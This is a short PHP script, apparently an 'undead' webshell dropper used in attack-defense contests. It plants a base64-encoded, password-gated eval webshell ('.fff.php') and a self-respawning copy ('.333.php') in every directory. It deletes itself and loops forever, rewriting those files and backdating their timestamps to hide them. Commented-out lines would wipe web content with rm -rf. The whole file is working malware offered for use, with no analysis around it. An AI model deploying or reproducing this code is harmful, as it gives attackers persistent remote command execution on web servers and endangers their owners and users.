<?php 
    function myscandir($path, &$arr) {
        foreach (glob($path) as $file) {
            if (is_dir($file)) {
                myscandir($file . '/*', $arr);
                $arr[] = realpath($file);
            }
        }
    }
    $allfiles;
    myscandir('./',  $allfiles);
    ignore_user_abort(true);
    set_time_limit(0);
    unlink(__FILE__);
    #md5 troj
    $file1 = '/.fff.php';
    $code1 = base64_decode('PD9waHAgaWYobWQ1KCRfUE9TVFsncGFzcyddKT09JzVkYTc4MTcwYTIwNzc4M2EwOWUxNzlkNDg4ZjRhOWMzJylAZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==');
    #undead troj
    $file2 = '/.333.php';
    $code2 = base64_decode('PD9waHAgCiAgICBpZ25vcmVfdXNlcl9hYm9ydCh0cnVlKTsKICAgIHNldF90aW1lX2xpbWl0KDApOwogICAgdW5saW5rKF9fRklMRV9fKTsKICAgICRmaWxlID0gJy4vLmZmZi5waHAnOwogICAgJGNvZGUgPSBiYXNlNjRfZGVjb2RlKCdQRDl3YUhBZ2FXWW9iV1ExS0NSZlVFOVRWRnNuY0dGemN5ZGRLVDA5SnpWa1lUYzRNVGN3WVRJd056YzRNMkV3T1dVeE56bGtORGc0WmpSaE9XTXpKeWxBWlhaaGJDZ2tYMUJQVTFSYkoyTnRaQ2RkS1RzL1BnPT0nKTsKICAgIHdoaWxlICgxKXsKICAgICAgICBzeXN0ZW0oJ3RvdWNoIC1tIC1kICIyMDIxLTEyLTAxIDA5OjEwOjEyIiAnIC4gJGZpbGUpOwogICAgICAgIGlmKG1kNShmaWxlX2dldF9jb250ZW50cygkZmlsZSkpIT09bWQ1KCRjb2RlKSkgewogICAgICAgICAgICBmaWxlX3B1dF9jb250ZW50cygkZmlsZSwgJGNvZGUpOwogICAgICAgIH0KICAgICAgICAjc3lzdGVtKCJmaW5kIC92YXIvd3d3L2h0bWwvIC1uYW1lIC5maXNoLnBocCB8IHhhcmdzIHJtIC1yZiIpOwogICAgICAgIHVzbGVlcCgxMDApOwogICAgfQo/Pg==');
    while (1){
        foreach($allfiles as $path){
            if(md5(file_get_contents($path.$file1))!==md5($code1)) {
                file_put_contents($path.$file1, $code1);
            }
            system('touch -m -d "2021-12-01 09:10:12" ' .$path.$file1);
            if(md5(file_get_contents($path.$file2))!==md5($code2)) {
                file_put_contents($path.$file2, $code2);
            }
            system('touch -m -d "2021-12-01 09:10:12" ' .$path.$file2);
            #system("rm -rf /var/www/html/* !(.fff.php)");
            usleep(100);
        }
    }
?>
